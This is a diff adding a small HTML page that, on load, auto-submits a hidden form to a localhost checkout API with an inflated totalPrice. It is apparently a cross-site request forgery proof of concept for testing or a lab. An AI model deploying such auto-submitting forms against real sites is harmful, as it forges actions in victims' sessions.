@@ -1,0 +1,11 @@
+<!doctype html>
+<html lang="en">
+  <body>
+    <form action="http://localhost:3000/api/checkout" method="POST">
+      <input type="hidden" name="totalPrice" value="999999" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
